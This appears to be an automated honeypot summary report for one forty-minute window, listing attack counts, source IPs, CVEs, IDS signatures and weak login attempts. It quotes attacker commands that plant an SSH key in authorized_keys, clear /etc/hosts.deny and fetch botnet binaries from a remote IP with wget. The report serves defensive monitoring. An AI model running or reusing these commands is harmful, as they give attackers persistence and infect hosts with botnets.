Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-14T21:01:45Z
**Timeframe:** 2025-10-14T20:20:01Z to 2025-10-14T21:00:01Z
**Files Used:**
* agg_log_20251014T202001Z.json
* agg_log_20251014T204001Z.json
* agg_log_20251014T210001Z.json

### Executive Summary
This report summarizes 20,855 malicious events recorded across multiple honeypots. The most targeted services were Cowrie (SSH), Honeytrap, and Sentrypeer (VoIP/SIP). A significant portion of the attacks originated from IP addresses 47.251.171.50, 206.191.154.180, and 185.243.5.146. Attackers frequently attempted to gain access using default or weak credentials, with a focus on dropping and executing malicious scripts. The most common attack vectors included SSH brute-forcing, exploitation of VNC and RDP services, and scanning for open ports.

### Detailed Analysis

**Attacks by Honeypot:**
* Cowrie: 6621
* Honeytrap: 4333
* Sentrypeer: 2772
* Suricata: 1860
* Ciscoasa: 1847
* Dionaea: 1068
* Redishoneypot: 1023
* Mailoney: 890
* Heralding: 230
* H0neytr4p: 70
* ssh-rsa: 68
* Tanner: 42
* Dicompot: 9
* Adbhoney: 8
* ElasticPot: 6
* ConPot: 5
* Ipphoney: 2
* Honeyaml: 1

**Top Attacking IPs:**
* 47.251.171.50
* 206.191.154.180
* 185.243.5.146
* 176.233.30.180
* 176.65.141.119

**Top Targeted Ports/Protocols:**
* 5060
* 445
* 6379
* 25
* 22
* vnc/5900

**Most Common CVEs:**
* CVE-2021-3449
* CVE-2019-11500
* CVE-2002-0013
* CVE-2002-0012
* CVE-1999-0517
* CVE-2021-35394

**Commands Attempted by Attackers:**
* `cd ~; chattr -ia .ssh; lockr -ia .ssh`
* `lockr -ia .ssh`
* `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
* `cat /proc/cpuinfo | grep name | wc -l`
* `uname -a`
* `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
* `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
* ET DROP Dshield Block Listed Source group 1
* ET SCAN MS Terminal Server Traffic on Non-standard Port
* ET INFO VNC Authentication Failure
* ET SCAN NMAP -sS window 1024
* ET HUNTING RDP Authentication Bypass Attempt

**Users / Login Attempts:**
* root/
* 345gs5662d34/345gs5662d34
* root/3245gs5662d34
* root/Password@2025
* root/Qaz123qaz

**Files Uploaded/Downloaded:**
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass
* boatnet.mpsl
* soap-envelope
* addressing
* discovery
* env:Envelope>

**HTTP User-Agents:**
* No HTTP User-Agents were recorded in this period.

**SSH Clients and Servers:**
* No specific SSH clients or servers were recorded in this period.

**Top Attacker AS Organizations:**
* No attacker AS organizations were recorded in this period.

### Key Observations and Anomalies
- A high volume of automated attacks is evident, characterized by the repetitive nature of commands and login attempts across a wide range of IPs.
- The `cd ~ && rm -rf .ssh && ...` command is a clear indicator of attackers attempting to install their own SSH keys for persistent access.
- The downloading of various `*.urbotnetisass` files suggests a coordinated campaign to deploy botnet clients on compromised systems, with variants for different architectures (ARM, x86, MIPS).
- The "ET INFO VNC Authentication Failure" and "ET SCAN MS Terminal Server Traffic on Non-standard Port" signatures indicate significant scanning and brute-force activity against remote access services.
- The presence of commands attempting to download and execute scripts from remote servers (`nohup bash -c ...`) highlights the immediate post-exploitation actions taken by attackers.
